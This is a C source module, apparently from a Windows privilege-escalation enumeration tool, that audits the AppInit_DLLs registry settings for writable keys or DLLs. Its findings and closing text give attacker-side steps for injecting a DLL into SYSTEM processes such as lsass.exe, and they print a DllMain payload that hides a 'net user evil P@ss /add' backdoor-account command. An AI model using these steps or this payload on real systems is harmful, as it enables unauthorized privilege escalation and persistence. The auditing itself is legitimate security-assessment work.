/*
 * appinit_dll.c — AppInit_DLLs / LoadAppInit_DLLs LPE Surface
 *
 * VULNERABILITY CLASS:
 *   AppInit_DLLs is a registry value that causes Windows to load specified DLLs
 *   into every process that loads user32.dll (essentially every GUI/interactive
 *   process). When LoadAppInit_DLLs = 1:
 *
 *   HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
 *   HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\LoadAppInit_DLLs
 *
 *   On 64-bit Windows there is also a WOW64 variant for 32-bit processes:
 *   HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows\...
 *
 * ATTACK SCENARIOS:
 *   1. LoadAppInit_DLLs = 1 AND key writable (misconfigured ACL):
 *      → Add our DLL path → injected into every process that loads user32.dll
 *      → Including: SYSTEM services, elevated processes, lsass.exe
 *
 *   2. DLL listed in AppInit_DLLs is in user-writable location:
 *      → Replace the DLL with payload → injected into all processes
 *
 *   3. DLL path in AppInit_DLLs does not exist:
 *      → Plant DLL in appropriate search path location
 *
 * IMPORTANT NOTE:
 *   On Windows 8+ with Secure Boot / UEFI: AppInit_DLLs is disabled when
 *   RequireSignedAppInit_DLLs = 1. This check includes that flag.
 *
 * HISTORICAL USE:
 *   - Used by malware (Flame, Duqu) for persistence
 *   - Used by some legitimate software (input method editors)
 *   - Disabled on many modern hardened systems but still present on:
 *     * Legacy enterprise deployments
 *     * Systems without Secure Boot
 *     * Systems with third-party software that needed it
 *
 * REFERENCES:
 *   KB197571: DLL injection via AppInit_DLLs
 *   MITRE ATT&CK: T1546.010 — Event Triggered Execution: AppInit DLLs
 *   https://attack.mitre.org/techniques/T1546/010/
 */

#include "../common.h"

#define KEY_WINDOWS_NT L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows"
#define KEY_WINDOWS_WOW L"SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows"

static void AuditAppInitKey(HKEY hRootKey, LPCWSTR subKey, LPCWSTR label, DWORD *findings) {
    HKEY hKey = NULL;
    if (RegOpenKeyExW(hRootKey, subKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        PrintInfo(L"  [skip] %s — not accessible\n", label);
        return;
    }

    /* Read LoadAppInit_DLLs */
    DWORD loadVal = 0, cb = sizeof(loadVal), type = 0;
    RegQueryValueExW(hKey, L"LoadAppInit_DLLs", NULL, &type, (LPBYTE)&loadVal, &cb);

    /* Read RequireSignedAppInit_DLLs */
    DWORD signedVal = 0;
    cb = sizeof(signedVal);
    RegQueryValueExW(hKey, L"RequireSignedAppInit_DLLs", NULL, &type, (LPBYTE)&signedVal, &cb);

    /* Read AppInit_DLLs */
    wchar_t dllList[MAX_PATH * 4] = {0};
    cb = sizeof(dllList);
    RegQueryValueExW(hKey, L"AppInit_DLLs", NULL, &type, (LPBYTE)dllList, &cb);

    PrintInfo(L"  %s:\n", label);
    PrintInfo(L"    LoadAppInit_DLLs              = %lu\n", loadVal);
    PrintInfo(L"    RequireSignedAppInit_DLLs      = %lu\n", signedVal);
    PrintInfo(L"    AppInit_DLLs                  = %s\n", *dllList ? dllList : L"(empty)");

    BOOL keyWritable = IsRegKeyWritable(hRootKey, subKey);
    PrintInfo(L"    Key writable by current user  = %s\n\n", keyWritable ? L"YES" : L"No");

    /* Check if injection is active */
    BOOL injectionActive = (loadVal == 1);
    BOOL signRequired    = (signedVal == 1);

    if (injectionActive && signRequired) {
        PrintInfo(L"    [note] AppInit active but signature required — unsigned DLLs blocked.\n");
    }

    /* Case 1: Key writable → can add our DLL */
    if (keyWritable) {
        Finding f;
        f.severity = injectionActive ? SEV_CRITICAL : SEV_HIGH;
        wcscpy(f.module, L"APPINITDLL");
        _snwprintf(f.target, _countof(f.target),
            L"[KEY WRITABLE] %s", label);
        _snwprintf(f.reason, _countof(f.reason),
            L"AppInit_DLLs registry key is WRITABLE by current user. "
            L"%s"
            L"Attack: (1) Set LoadAppInit_DLLs=1 "
            L"(2) Set AppInit_DLLs=C:\\payload.dll "
            L"(3) Every process loading user32.dll will load our DLL. "
            L"High-value targets: lsass.exe, winlogon.exe, services.exe, svchost.exe. "
            L"%s"
            L"Payload DLL: only needs DllMain — no required exports.",
            injectionActive ? L"LoadAppInit_DLLs is already ENABLED. " : L"",
            signRequired ? L"[WARNING] Signature check active — DLL must be signed." : L"");
        PrintFinding(&f);
        (*findings)++;
    }

    /* Case 2: DLLs listed → check writability */
    if (injectionActive && *dllList) {
        /* AppInit_DLLs is space/comma-separated list */
        wchar_t listCopy[MAX_PATH * 4];
        wcsncpy(listCopy, dllList, _countof(listCopy) - 1);

        wchar_t *p = listCopy;
        wchar_t *tok;
        /* tokenize by space and comma */
        while (*p) {
            while (*p == L' ' || *p == L',') p++;
            if (!*p) break;
            tok = p;
            while (*p && *p != L' ' && *p != L',') p++;
            if (*p) { *p = L'\0'; p++; }

            if (!*tok) continue;

            wchar_t expanded[MAX_PATH * 2] = {0};
            ExpandEnvironmentStringsW(tok, expanded, _countof(expanded));

            BOOL exists   = (GetFileAttributesW(expanded) != INVALID_FILE_ATTRIBUTES);
            BOOL writable = exists && IsFileWritable(expanded);
            BOOL inUser   = IsUserWritablePath(expanded);

            if (!exists) {
                Finding f;
                f.severity = SEV_HIGH;
                wcscpy(f.module, L"APPINITDLL");
                _snwprintf(f.target, _countof(f.target),
                    L"[MISSING DLL] %s", tok);
                _snwprintf(f.reason, _countof(f.reason),
                    L"AppInit_DLL is MISSING: %s\n"
                    L"        LoadAppInit is %s. If enabled, Windows tries to load this on "
                    L"every user32.dll load.\n"
                    L"        Plant the DLL in a searched location to get injection into "
                    L"ALL processes (including SYSTEM services).",
                    expanded, injectionActive ? L"ENABLED" : L"disabled");
                PrintFinding(&f);
                (*findings)++;
            } else if (writable) {
                Finding f;
                f.severity = SEV_CRITICAL;
                wcscpy(f.module, L"APPINITDLL");
                _snwprintf(f.target, _countof(f.target),
                    L"[WRITABLE DLL] %s", tok);
                _snwprintf(f.reason, _countof(f.reason),
                    L"AppInit_DLL is WRITABLE: %s\n"
                    L"        Replace this DLL → injected into EVERY process loading user32.dll.\n"
                    L"        LoadAppInit = %s  RequireSigned = %s",
                    expanded,
                    injectionActive ? L"1 (ACTIVE)" : L"0",
                    signRequired ? L"1 (signed required!)" : L"0");
                PrintFinding(&f);
                (*findings)++;
            } else if (inUser) {
                Finding f;
                f.severity = SEV_MEDIUM;
                wcscpy(f.module, L"APPINITDLL");
                _snwprintf(f.target, _countof(f.target),
                    L"[USER-PATH DLL] %s", tok);
                _snwprintf(f.reason, _countof(f.reason),
                    L"AppInit_DLL in user-accessible path: %s — verify file ACL directly.",
                    expanded);
                PrintFinding(&f);
                (*findings)++;
            }
        }
    }

    RegCloseKey(hKey);
}

void Module_AppInitDLL(void) {
    PrintHeader(L"APPINIT_DLLS  [DLL injection into every user32.dll-loading process]");

    PrintInfo(
        L"  AppInit_DLLs causes Windows to load specified DLLs into ALL processes\n"
        L"  that load user32.dll (virtually all GUI/interactive processes).\n"
        L"  Writable key or listed DLL = inject into SYSTEM services.\n\n");

    DWORD findings = 0;

    AuditAppInitKey(HKEY_LOCAL_MACHINE, KEY_WINDOWS_NT,  L"HKLM 64-bit", &findings);
    AuditAppInitKey(HKEY_LOCAL_MACHINE, KEY_WINDOWS_WOW, L"HKLM WOW64",  &findings);

    if (findings == 0)
        PrintInfo(L"  No AppInit_DLLs LPE surface found.\n");
    else {
        PrintInfo(L"  Total findings: %lu\n\n", findings);
        PrintInfo(
            L"  EXPLOITATION:\n"
            L"    Minimal DLL (no exports needed):\n"
            L"      BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {\n"
            L"          if (reason == DLL_PROCESS_ATTACH)\n"
            L"              WinExec(\"net user evil P@ss /add\", SW_HIDE);\n"
            L"          return TRUE;\n"
            L"      }\n"
            L"    Note: DllMain runs very early — avoid complex operations.\n"
            L"    Trigger: start any GUI application (notepad.exe, calc.exe, etc.)\n");
    }
}
